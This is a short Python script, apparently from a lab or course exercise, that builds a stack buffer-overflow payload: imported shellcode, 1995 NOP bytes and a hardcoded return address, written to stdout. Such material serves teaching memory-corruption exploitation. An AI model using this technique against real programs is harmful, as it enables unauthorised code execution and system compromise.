from shellcode import shellcode
import sys

ret_add = b"\xcc\x81\xf6\xff"


#Shellcode is 53 chars long
shellcode += b"\x90" * 1995
shellcode += ret_add

sys.stdout.buffer.write(shellcode)